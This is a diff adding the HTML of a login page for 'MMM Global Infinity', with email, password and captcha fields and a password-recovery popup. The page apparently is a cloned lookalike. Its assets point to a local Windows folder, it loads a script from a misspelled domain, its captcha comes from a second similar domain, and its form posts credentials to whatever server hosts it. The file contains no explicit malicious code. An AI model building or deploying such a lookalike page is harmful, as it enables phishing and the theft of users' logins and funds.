@@ -1,0 +1,357 @@
+<html><script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link type="image/x-icon" href="file:///C:/Users/Administrator/Documents/24082022/MMM%20NEW/favicon.ico" rel="icon">
+<link type="image/x-icon" href="file:///C:/Users/Administrator/Documents/24082022/MMM%20NEW/favicon.ico" rel="shortcut icon">
+<title>MMM Global Infinity - Login</title>
+<script type="text/javascript" src="https://mmmofice.com/ajax.js"></script>
+<style type="text/css">
+html,body{
+background: url("file:///C:/Users/Administrator/Documents/24082022/MMM%20NEW/1909462.png");
+background-size: cover !important;
+background-repeat: no-repeat !important;
+background-position: center center !important;
+font-family:Verdana,"Geneva CY","DejaVu Sans",sans-serif;}
+input[type="text"]:focus { outline: none; }
+input[type="password"]:focus { outline: none; }
+#container{width:400px;height:250px;position:absolute;left:50%;top:50%;margin-left:-200px;margin-top:-244px;}
+.form_wrap{padding:30px 15px;background:#fff;border:4px solid #CC8822;border-radius:10px;-webkit-border-radius:10px;-moz-border-radius:10px;-khtml-border-radius:10px;}
+.input_text{
+	color: #352c2c;
+	font-size: 13px;
+	padding: 6px 0 4px 10px;
+	border: 1px solid #cecece;
+	background: #F6F6f6;
+	border-radius: 6px;
+	width:200px;
+}
+.input_text2{
+	color: #352c2c;
+	font-size: 13px;
+	padding: 6px 0 4px 10px;
+	border: 1px solid #cecece;
+	background: #F6F6f6;
+	border-radius: 6px;
+	width:43px;
+}
+
+.h_login {
+	border:0;
+	background-color: #ff8c00;
+	color: #fff;
+	padding:6px 26px 6px;
+	font-size:14px;
+	cursor:pointer;
+	box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
+	border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;
+}
+
+.h_login:hover {
+	background-color: #e07b01;
+}
+
+.h_reg {
+	border:0;
+	background-color: #33cc77;
+	color: #fff;
+	padding:6px 10px 6px;
+	font-size:14px;
+	cursor:pointer;
+	box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
+	border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;
+}
+
+.h_reg:hover {
+	background-color: #28ad63;
+}
+
+.h_cancel {
+	border:0;
+	background-color: #ff7362;
+	color: #fff;
+	padding:6px 22px 6px;
+	font-size:14px;
+	cursor:pointer;
+	box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
+	border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;
+}
+
+.h_cancel:hover {
+	background-color: #e16556;
+}
+
+.input_text3{background:#ccc;border:0;font-size:13px;padding:3px 7px;color:#666;border-radius:3px;-webkit-border-radius:3px;-moz-border-radius:3px;-khtml-border-radius:3px;width:197px;}
+h1{background:url('file:///C:/Users/Administrator/Documents/24082022/MMM%20NEW/logo.gif') 42px top no-repeat;height:40px;line-height:40px;font-size:18px;padding:0 0 10px 115px; margin:0; float:left; font-family:Verdana,"Geneva CY","DejaVu Sans",sans-serif; font-weight:400}
+.lf_head{background:url('img/logo.gif') 42px top no-repeat;height:40px;line-height:40px;font-size:20px;padding:0 0 10px 115px;}.lf_head .lang{float:right;margin:5px 20px 0 0;}.lf_head div{float:left;}
+.lf_line{padding:0 0 5px 0;}.lf_line p{text-align:center;margin-top:20px;font-size:12px;color:#777;}.lf_line label{float:left;width:105px;text-align:right;font-size:12px;margin:0 10px 0 0;line-height:21px;}.lf_line button{margin:0 0 0 145px;outline:none;box-shadow:1px 1px 1px #946d3f;}.lf_line .lf_line_italic{font-size:11px;font-style:italic;color:#777;margin:5px 25px 5px 115px;text-align:left;line-height:12px;}.lf_line .lf_line_italic a{margin:0 0 5px 0;display:block;}.lf_line select{background:#ccc;border:1px solid #ccc;border-radius:4px;color:#666;font-size:14px;padding:1px;width:194px;}.lf_line select option{color:#666;}
+.button_orange,.button_green,.button_green2,.button_pink{border:0;background:#000;color:#fff;font-size:12px;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;padding:5px 20px;cursor:pointer;}.button_orange{background:darkorange;}.button_green{background:#7DC55A;}.button_green2{background:#7DC55A;}.button_pink{background:#FF7362;position:absolute;top:144px;left:140px;}
+</style>
+<style>
+    body {
+    font-family:verdana;
+    font-size:15px;
+    }  
+
+    .link {color:#cbcbcb; text-decoration:none}
+    .link:hover {color:#b9b9b9; text-decoration:none}  
+
+#mask {
+    position:absolute;
+    left:0;
+    top:0;
+    z-index:9000;
+    background-color:#000;
+    display:none;
+    }
+
+#boxes .window {
+    position:absolute;
+    left:0;
+    top:0px;
+    -top: 40px;
+    width:440px;
+    height:200px;
+    display:none;
+    z-index:9999;
+	
+	border: 4px #cc8822 solid;
+ 	-moz-border-radius: 10px;
+ 	-webkit-border-radius: 10px;
+ 	-khtml-border-radius:10px;
+ 	border-radius: 10px;
+	
+    padding: 20px;
+    overflow: hidden;
+    }  
+
+#boxes #dialog {
+    width:466px; 
+    height:199px;
+    padding:10px;
+    background-color:#ffffff;
+    }
+
+.top {
+	font-family:Lucida Console;
+	background-color:#fff;
+	font-size:24px;
+    position:absolute;
+    left:0;
+    top:0;
+    width:466px;
+    height:-20px;
+    padding: 8px 20px 6px 10px;
+    }
+
+.close {
+    float:right;
+    }
+
+.content {
+    padding-top: 35px;
+}
+.hyper {
+	color: #000
+}
+</style>
+<script type="text/javascript">
+	function check() {
+		p_email=document.myform.login.value.toString();
+		if (p_email!='') {
+			t=p_email.indexOf('@');
+			
+			if ((p_email.indexOf('.')==-1) || (t==-1) || (t < 1) || (t > p_email.length - 5) || (p_email.charAt(t - 1)=='.') || (p_email.charAt(t + 1)=='.')) {		
+				alert('Incorrect email!');
+  				document.myform.login.focus();
+  				return false;
+			}
+		} else {
+			alert('You must enter email!');
+ 			document.myform.login.focus();
+ 			return false;
+		}
+		
+		p_pass=document.myform.pass.value.toString();
+		if (p_pass.length<5 || p_pass.length>99) {
+			alert ('Password length must be 5 characters!');
+			document.myform.pass.focus();
+			return false;
+		}
+		
+		p_captcha=document.myform.captcha.value.toString();
+		if (p_captcha.length<5 || p_captcha.length>5) {
+			alert ('Invalid captcha!');
+			document.myform.captcha.focus();
+			return false;
+		}
+	}
+	
+	function check2() {
+		p_email=document.myform2.recovery_email.value.toString();
+		if (p_email!='') {
+			t=p_email.indexOf('@');
+			
+			if ((p_email.indexOf('.')==-1) || (t==-1) || (t < 1) || (t > p_email.length - 5) || (p_email.charAt(t - 1)=='.') || (p_email.charAt(t + 1)=='.')) {		
+				alert('Incorrect email!');
+  				document.myform2.recovery_email.focus();
+  				return false;
+			}
+		} else {
+			alert('You must enter email!');
+ 			document.myform2.recovery_email.focus();
+ 			return false;
+		}
+	}
+</script>
+<script type="text/javascript">
+$(document).ready(function() {  
+	document.myform.login.focus();	
+    $('a[name=modal]').click(function(e) {
+    e.preventDefault();
+    var id = $(this).attr('href');
+    var maskHeight = $(document).height();
+    var maskWidth = $(window).width();
+    $('#mask').css({'width':maskWidth,'height':maskHeight});
+    $('#mask').fadeIn(100); 
+    $('#mask').fadeTo("slow",0.8); 
+    var winH = $(window).height();
+    var winW = $(window).width();
+    $(id).css('top',  winH/2-$(id).height()/2);
+    $(id).css('left', winW/2-$(id).width()/2);
+    $(id).fadeIn(200); 
+    });
+    $('.window .close').click(function (e) { 
+    e.preventDefault();
+    $('#mask, .window').hide();
+    }); 
+    $('#mask').click(function () {
+    $(this).hide();
+    $('.window').hide();
+    }); 
+   });
+   
+	function closeModal() {
+		$('#mask').hide();
+		$('#dialog').hide();
+	}
+	
+	function showDialogBox(name_window) {
+		var id = $(name_window);
+		var maskHeight = $(document).height();
+		var maskWidth = $(window).width();
+		
+		$('#mask').css({'width':maskWidth,'height':maskHeight});
+		$('#mask').fadeIn(100); 
+		$('#mask').fadeTo("slow",0.8); 
+		
+		var winH = $(window).height();
+		var winW = $(window).width();
+		
+		$(id).css('top',  winH/2-$(id).height()/2);
+		$(id).css('left', winW/2-$(id).width()/2);
+		$(id).fadeIn(200);
+		
+		if (name_window=='#accounts') {
+			document.myform1.bitcoin_address.focus();
+		}
+		document.myform2.recovery_email.focus();
+	}  
+	window.onresize = function () {
+		var maskHeight = $(document).height();
+		var maskWidth = $(window).width();
+		
+		$('#mask').css({'width':maskWidth,'height':maskHeight});
+	}
+	
+	function ShowCaptcha() {
+		rFrame.document.location = 'index.php?action=showcaptcha';
+	}
+</script>
+</head>
+<body>
+<iframe id="rFrame" name="rFrame" style="display: none"></iframe>
+	<div id="container">
+		<!-- <center><img style="margin-bottom:5px; cursor:pointer" src="img/mmm2.png" onclick="document.location='http://mmmgi.com'"  /></center> -->
+				<center><a href=""><img style="margin-bottom:5px;" src="file:///C:/Users/Administrator/Documents/24082022/MMM%20NEW/mmm2.png" border="0" title="Official home page" alt="Join MMM Global Infinity">
+				<img style="margin-bottom:5px; display:none;" src="img/mmm2.png" border="0" title="官方頁面站點" alt="Join MMM Global Infinity"></a></center>
+				<div class="form_wrap">
+							<h1>Login to MMM system</h1>
+				<h1 style="display:none;"><strong>登录MMM系统</strong></h1>
+						
+			<form name="myform" action="" method="post" onsubmit="return check();">
+				<div class="lf_line">
+					<label for="ulogin" style="padding-top:3px;">Email:</label><label for="ulogin" style="padding-top:3px; display:none;">电邮:</label>						
+					
+					<input type="text" name="login" id="ulogin" maxlength="50" value="" class="input_text" required=""><br>				</div>
+	
+				<div class="lf_line">
+					<label for="upass" style="padding-top:3px;">Password:</label><label for="upass" style="padding-top:3px; display:none;">密码:</label>					
+					<input type="password" name="pass" id="upass" maxlength="32" class="input_text" required=""><br>
+				</div>
+				
+				<div class="lf_line">
+					<label for="uCaptcha" style="padding-top:3px;">Captcha:</label><label for="uCaptcha" style="padding-top:3px; display:none;">验证码:</label>					
+					<input type="text" name="captcha" id="uCaptcha" value="" class="input_text2" maxlength="5" onkeypress="javascript: if (event.keyCode!=13) { if((event.charCode < 48)||(event.charCode > 57)) return false; }" required="">
+					<img src="https://mmmoffice.org/img.php?sid=e913e33c4473cd358c4967ecea32928a" style="position:absolute">
+					<a style="font-size:11px; position:absolute; margin-top:6px; padding-left:65px; display:none;" href="javascript:void(0)" onclick="ShowCaptcha();" class="hyper">無法閱讀？</a>
+									</div>
+				
+				<div style="padding-left:115px; padding-top:5px;">
+											<button class="h_login" id="do" title="Login">Login</button>
+						<button class="h_login" id="do" style="display:none;">登入</button>
+						
+						<button type="reset" class="h_reg" id="do2" title="Fast registration" onclick="document.location='#'">Fast registration</button>
+						<button type="reset" class="h_reg" id="do2" onclick="document.location='#" style="display:none;">即时登记</button>
+										</div>
+			</form>
+			<div style="padding-bottom:36px"></div>
+						<a href="javascript:void(0)" onclick="showDialogBox('#dialog');" class="hyper" style="float:right; font-style:italic; font-size:12px;">Get a new password?</a>
+			<a href="javascript:void(0)" onclick="showDialogBox('#dialog');" class="hyper" style="float:right; font-style:italic; font-size:12px; display:none;">获取新密码？</a>
+			
+			<br><span style="color:#777; float:right; font-style:italic; font-size:12px;">If you have forgotten your old password</span>
+			<span style="color:#777; float:right; font-style:italic; font-size:12px; display:none;">如果您忘记了旧密码</span>
+				  </div>
+	</div>
+
+
+<!-- Popup window -->
+<div id="boxes"> 
+<div id="dialog" class="window">
+<div class="top"><a href="#" title="Close" class="link close">X</a><a style="display:none;" href="#" title="關閉" class="link close">X</a></div>
+
+<div class="content">
+
+<form name="myform2" action="index" method="post" onsubmit="return check2();">
+
+<div class="lf_head">Password recovery</div>
+<div class="lf_head" style="display:none;">密码恢复</div>
+
+<div class="lf_line">
+<label for="recovery_email" style="padding-top:3px;">Email:</label>
+<label for="recovery_email" style="padding-top:3px; display:none;">电邮:</label>
+	<input type="text" name="recovery_email" id="recovery_email" value="" class="input_text" required=""><br>
+		<p class="lf_line_italic">(for example: myemail@gmail.com)</p>
+	<p class="lf_line_italic" style="display:none;">(例如: 2252057736@qq.com)</p>
+	</div>
+
+
+<div style="padding-left:115px; padding-top:10px;">
+<button class="h_reg" title="Send a request">Send a request</button>
+<button class="h_reg" style="display:none;">发送请求</button>
+<button type="reset" class="h_cancel" title="Cancel" onclick="closeModal();">Cancel</button>
+<button type="reset" class="h_cancel" onclick="closeModal();" style="display:none;">取消</button>
+</div>
+</form>
+
+</div>
+
+</div>
+</div>
+
+
+
+<!-- Mask -->
+<div id="mask" style="width: 1920px; height: 929px;"></div>
+
+
+</body></html>
